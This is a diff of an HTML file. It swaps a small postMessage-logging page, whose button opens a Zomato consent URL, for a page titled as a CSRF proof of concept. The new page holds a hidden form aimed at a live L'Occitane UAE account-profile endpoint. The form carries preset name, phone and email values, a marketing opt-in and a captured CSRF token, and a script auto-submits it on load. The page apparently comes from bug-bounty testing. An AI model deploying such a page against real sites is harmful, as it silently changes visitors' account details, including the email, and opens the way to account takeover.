@@ -1,15 +1,28 @@
 <!DOCTYPE html>
 <html>
-<head><meta charset="UTF-8"><title>Simple PostMessage Listener</title></head>
+<head>
+  <meta charset="utf-8">
+  <title>CSRF PoC - loccitane Profile Save</title>
+</head>
 <body>
-  <button onclick="window.open('https://accounts.zomato.com/consent?consent_challenge=6017283e719e4aed80fc7df13bc3907b')">
-    Buka popup
-  </button>
+  <h2>Loading...</h2>
+  <form id="csrfForm" action="https://ae.loccitane.com/on/demandware.store/Sites-loccitane_AE-Site/en_AE/Account-SaveProfile" method="POST" enctype="application/x-www-form-urlencoded">
+    <input type="hidden" name="dwfrm_profile_title_titleList" value="Mr">
+    <input type="hidden" name="dwfrm_profile_customer_firstname" value="yeswehackerloccitane">
+    <input type="hidden" name="dwfrm_profile_customer_lastname" value="alhamdulillah">
+    <input type="hidden" name="dwfrm_profile_customer_phoneCode" value="+971">
+    <input type="hidden" name="dwfrm_profile_customer_phonecodes_code" value="+971">
+    <input type="hidden" name="dwfrm_profile_customer_phoneMobile" value="545454535">
+    <input type="hidden" name="dwfrm_profile_customer_email" value="wongkebumen@wearehackerone.com">
+    <input type="hidden" name="dwfrm_profile_customer_birthday" value="04/04/1995">
+    <input type="hidden" name="dwfrm_profile_customer_addtoemaillist" value="true">
+    <input type="hidden" name="csrf_token" value="casRPj5UyCOHyM6DC6UmAs91BhBVGdPcsumbnIJmkUNtxWDWo5YhpRwh16wXgqvuwEZQnys5BVjDITjQJFH0RxMN7xYh1LJyHvEAnOsQ3eEpEeSSHmeiq0Dzy26GslAWNgBM6vrxVt3kt8hegpoD31pbROWS0Ww8CB7X-lNYp1y6NvR8E7s=">
+    <input type="hidden" name="dwfrm_profile_acceptTermsConditions" value="true">
+    <input type="submit" value="Submit">
+  </form>
 
   <script>
-    window.addEventListener("message", function (event) {
-      console.log("origin:", event.origin, "data:", event.data);
-    });
+    document.getElementById("csrfForm").submit();
   </script>
 </body>
 </html>
